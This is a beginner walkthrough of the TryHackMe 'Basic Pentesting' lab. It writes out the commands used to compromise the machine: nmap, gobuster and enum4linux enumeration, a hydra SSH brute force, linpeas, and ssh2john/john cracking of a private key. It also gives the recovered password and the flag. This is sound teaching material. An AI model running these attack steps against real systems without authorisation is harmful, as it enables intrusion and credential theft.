## 📌 Overview

**Room Name:** Basic Pentesting  
**Platform:** TryHackMe  
**Original Author:** Josiah Pierce (VulnHub)  
**Difficulty:** Easy  
**Category:** Linux / Enumeration / Privilege Escalation  

This room is designed to introduce beginners to **real-world penetration testing methodology**.  
It simulates a vulnerable Linux machine that can be compromised using common offensive security techniques such as:

- Service enumeration  
- Information disclosure analysis  
- Credential brute-forcing  
- SSH key abuse  
- Privilege escalation  

The goal is to demonstrate how seemingly small misconfigurations can be chained together to fully compromise a system.

---

## ⚙️ Environment Setup

Before starting the assessment, the following environment was prepared:

- Kali Linux attacker machine
- Active TryHackMe VPN connection
- Tools available:
  - nmap
  - gobuster
  - enum4linux
  - hydra
  - linpeas
  - john

> ⚠️ Without VPN connectivity, the target machine cannot be reached.

---

## 🔍 1. Enumeration Phase

Enumeration is the most important phase of penetration testing.  
The objective is to identify services, users, and misconfigurations that can be exploited later.

---

### 🔎 Nmap Scan

```bash
nmap -sC -sV <target_ip>
```

### 📄 Results

```
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
```

### 🧠 Analysis

- Ports **139** and **445** indicate **SMB (Samba)** services
- Samba often allows:
  - User enumeration
  - File sharing
  - Credential attacks
- These services are commonly misconfigured on beginner-level machines

At this stage, SMB became the primary attack surface.

---

## 🌐 2. Web Directory Enumeration

Next, directory brute-forcing was performed to discover hidden resources.

```bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
```

### 📁 Discovered Directory

```
/development
```

### 📄 Contents

- `dev.txt`
- `j.txt`

### 📝 Analysis

The files revealed:

- Mentions of two developers: **Jan** and **Kay**
- Discussion of development issues
- Hints that **Jan uses a weak password**
- Evidence of poor operational security

This is a classic example of **information leakage** caused by developers leaving internal notes publicly accessible.

---

## 🧭 3. SMB Enumeration

Using `enum4linux`, further enumeration was performed.

```bash
enum4linux <target_ip>
```

### 👤 Discovered Users

```
jan
kay
```

### 🔍 Significance

- Confirms usernames found in web files
- Provides valid login targets
- Strong indication that authentication-based attacks may succeed

---

## 🔓 4. Initial Access – SSH Brute Force

Based on gathered intelligence, user **jan** was targeted.

```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt <target_ip> ssh
```

### ✅ Result

```
jan : armando
```

### 🧠 Why This Worked

- Weak password
- No account lockout
- No rate limiting
- SSH exposed publicly

This demonstrates how dangerous weak credentials are in real-world environments.

---

## 🔄 5. Post-Exploitation & Lateral Movement

Login as jan:

```bash
ssh jan@<target_ip>
```

After exploring the system:

```
/home/kay/pass.bak
```

### ❌ Access Denied

This confirms:
- Another privileged user exists
- Additional escalation is required

---

## 🚀 6. Privilege Escalation Discovery

To locate possible escalation vectors, **linPEAS** was executed.

```bash
./linpeas.sh
```

### 🔑 Critical Finding

```
/home/kay/.ssh/id_rsa
```

### ⚠️ Security Issue

- Private SSH key readable by another user
- Key is encrypted but crackable
- Extremely dangerous misconfiguration

---

## 🔐 7. SSH Key Cracking

### Step 1: Convert Key Format

```bash
ssh2john id_rsa > id_rsa.hash
```

### Step 2: Crack Passphrase

```bash
john --wordlist=rockyou.txt id_rsa.hash
```

### ✅ Result

Passphrase successfully recovered using a common wordlist.

---

## 🔓 8. Privilege Escalation (Final Access)

Using the decrypted key:

```bash
ssh -i id_rsa kay@<target_ip>
```

At this point, full access to the system is obtained.

---

## 🏁 9. Flag Retrieval

```bash
cat pass.bak
```

🎯 **Flag**
```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

---

## 🧠 Key Takeaways

### 🔐 Security Lessons

- Enumeration is the most critical phase
- Developers often leak sensitive information
- Weak passwords remain extremely common
- SSH keys must be properly protected
- Privilege escalation often relies on small misconfigurations
- linPEAS is an essential post-exploitation tool

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|--------|
| nmap | Network and service discovery |
| gobuster | Directory brute forcing |
| enum4linux | SMB enumeration |
| hydra | Credential brute forcing |
| linpeas | Privilege escalation |
| john | Password cracking |

---

## 📚 Conclusion

This room is an excellent learning resource for beginners who want to understand:

- How attackers think
- How vulnerabilities are chained
- Why secure configuration matters
- How real-world Linux systems are compromised

It closely reflects real penetration testing methodology and is highly recommended for anyone preparing for:

- eJPT
- PNPT
- OSCP (foundational level)
